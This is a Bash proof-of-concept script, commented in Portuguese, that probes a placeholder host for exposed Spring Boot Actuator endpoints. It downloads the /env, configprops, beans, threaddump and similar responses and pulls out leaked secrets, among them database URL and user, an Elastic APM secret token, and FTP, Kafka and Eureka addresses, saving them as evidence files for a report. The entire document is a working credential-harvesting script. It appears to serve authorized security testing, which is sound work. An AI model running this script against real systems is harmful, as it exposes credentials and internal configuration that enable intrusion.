#!/usr/bin/env bash
set -euo pipefail

BASE="https://api.exemplo.com.br"
OUT="poc_external_actuator"
mkdir -p "$OUT"; cd "$OUT"

echo "[*] Enumerando endpoints comuns do Actuator (GET apenas) ..."
ENDPOINTS=(
  "/api/management" "/api/management/env" "/api/management/health" "/api/management/info"
  "/api/actuator" "/api/actuator/env" "/api/actuator/health" "/api/actuator/info" "/api/actuator/metrics" "/api/actuator/prometheus"
  "/actuator" "/actuator/env" "/actuator/health" "/actuator/info" "/actuator/metrics" "/actuator/prometheus"
  "/management" "/management/env" "/management/health" "/management/info"
  "/api/management/configprops" "/api/management/beans" "/api/management/mappings" "/api/management/conditions" "/api/management/threaddump" "/api/management/scheduledtasks"
  "/actuator/configprops" "/actuator/beans" "/actuator/mappings" "/actuator/conditions" "/actuator/threaddump" "/actuator/scheduledtasks"
)

# Tentar cada endpoint e salvar cabeçalhos + corpo (até 500KB p/ evitar dumps gigantes)
for p in "${ENDPOINTS[@]}"; do
  safe="$(echo "$p" | tr '/:' '__')"
  echo -e "\n==> Testando ${BASE}${p}"
  curl -skI --max-time 12 "${BASE}${p}" | tee "hdr${safe}.txt" >/dev/null
  code=$(tail -n1 "hdr${safe}.txt" | awk '{print $2}' || true)
  if [ "${code:-}" = "200" ] || [ "${code:-}" = "206" ]; then
    # baixa até 500KB para evidenciar conteúdo sem baixar heaps enormes
    curl -sk --max-time 20 -H 'Accept: application/json' -r 0-512000 "${BASE}${p}" | tee "body${safe}.txt" >/dev/null || true
  fi
done

echo "[*] Extraindo vazamentos do /env se presente ..."
ENV_FILE=""
for cand in body__api__management__env.txt body__actuator__env.txt body__management__env.txt; do
  if [ -s "$cand" ]; then ENV_FILE="$cand"; break; fi
done

if [ -z "$ENV_FILE" ]; then
  echo "[!] Não foi possível baixar o /env (talvez exposto em outro caminho). Tentando baixar diretamente conhecido..."
  curl -sk "${BASE}/api/management/env" -o body__api__management__env.txt || true
  [ -s body__api__management__env.txt ] && ENV_FILE="body__api__management__env.txt"
fi

# Função simples para grep JSON sem jq
jgrep () { grep -oE "\"$1\"\\s*:\\s*\"[^\"]+\"" "$ENV_FILE" | sed -E "s/.*\"$1\"\\s*:\\s*\"([^\"]+)\".*/\\1/"; }

if [ -n "$ENV_FILE" ] && [ -s "$ENV_FILE" ]; then
  echo "[*] Vazamentos encontrados no ${ENV_FILE}:"

  # Extrair campos críticos
  EUREKA_URL="$(jgrep EUREKA_CLIENT_SERVICE_URL_DEFAULTZONE || true)"
  DS_URL="$(jgrep SPRING_DATASOURCE_URL || true)"
  DS_USER="$(jgrep SPRING_DATASOURCE_USERNAME || true)"
  APM_TOKEN="$(jgrep 'elastic.apm.secret_token' || true)"
  KAFKA_BOOT="$(jgrep SPRING_KAFKA_PROPERTIES_BOOTSTRAP_SERVERS || true)"
  FTP_URL="$(jgrep APPLICATION_SERVERS_FTP_URL || true)"
  MANAGER_TCP="$(jgrep MANAGER_PROD_PORT_80_TCP || true)"

  printf "%s\n" "$EUREKA_URL" > EV1_eureka_url.txt
  printf "%s\n" "$DS_URL"     > EV2_datasource_url.txt
  printf "%s\n" "$DS_USER"    > EV3_datasource_user.txt
  printf "%s\n" "$APM_TOKEN"  > EV4_apm_token.txt
  printf "%s\n" "$KAFKA_BOOT" > EV5_kafka_bootstrap.txt
  printf "%s\n" "$FTP_URL"    > EV6_ftp_url.txt
  printf "%s\n" "$MANAGER_TCP"> EV7_manager_tcp.txt

  # Também guardar o ENV bruto para evidência
  cp "$ENV_FILE" 00_env_raw.txt

  # Criar versão sanitizada para compartilhar
  sed -E 's#://([^:/@]+):([^@]+)@#://\1:********@#g; s#(password|token|secret|passwd[^\"]*":\s*")[^"]+#\1********#Ig' \
    "$ENV_FILE" > 00_env_sanitized.txt
fi

echo "[*] Coletando config extras se liberadas (configprops/mappings/beans/metrics/prometheus) ..."
for p in "/api/management/configprops" "/api/management/mappings" "/api/management/beans" "/api/management/metrics" "/api/management/prometheus" \
         "/actuator/configprops" "/actuator/mappings" "/actuator/beans" "/actuator/metrics" "/actuator/prometheus"; do
  safe="$(echo "$p" | tr '/:' '__')"
  if [ -s "hdr${safe}.txt" ] && grep -q "200" "hdr${safe}.txt"; then
    echo "  - Salvando ${p}"
    curl -sk --max-time 20 -H 'Accept: application/json' -r 0-512000 "${BASE}${p}" | tee "body${safe}.txt" >/dev/null || true
  fi
done

echo "[*] Gerando SUMMARY.txt ..."
{
  echo "=== PoC EXTERNA — Spring Actuator Exposto ==="
  date -Is
  echo
  echo "Host: ${BASE}"
  echo
  echo "Endpoints com HTTP 200 (cabeçalhos salvos):"
  ls -1 hdr__*.txt 2>/dev/null | while read -r f; do
    if grep -q " 200 " "$f"; then echo " - ${f#hdr__}"; fi
  done
  echo
  echo "Principais vazamentos do /env:"
  [ -s EV1_eureka_url.txt ] && echo " - EUREKA_CLIENT_SERVICE_URL_DEFAULTZONE: $(cat EV1_eureka_url.txt)"
  [ -s EV2_datasource_url.txt ] && echo " - SPRING_DATASOURCE_URL: $(cat EV2_datasource_url.txt)"
  [ -s EV3_datasource_user.txt ] && echo " - SPRING_DATASOURCE_USERNAME: $(cat EV3_datasource_user.txt)"
  [ -s EV4_apm_token.txt ] && echo " - elastic.apm.secret_token: (capturado — mascarado no arquivo sanitizado)"
  [ -s EV5_kafka_bootstrap.txt ] && echo " - SPRING_KAFKA_PROPERTIES_BOOTSTRAP_SERVERS: $(cat EV5_kafka_bootstrap.txt)"
  [ -s EV6_ftp_url.txt ] && echo " - APPLICATION_SERVERS_FTP_URL: $(cat EV6_ftp_url.txt)"
  [ -s EV7_manager_tcp.txt ] && echo " - MANAGER_PROD_PORT_80_TCP: $(cat EV7_manager_tcp.txt)"
  echo
  echo "Artefatos gerados (para o relatório):"
  ls -lh 00_env_sanitized.txt EV*.txt body__api__management__env.txt body__actuator__env.txt 2>/dev/null || true
  echo
  echo "Nota: Todos os testes foram feitos via HTTP GET, sem alterar estado."
} | tee SUMMARY.txt

echo "[✓] Concluído. Pasta de evidências: $(pwd)"
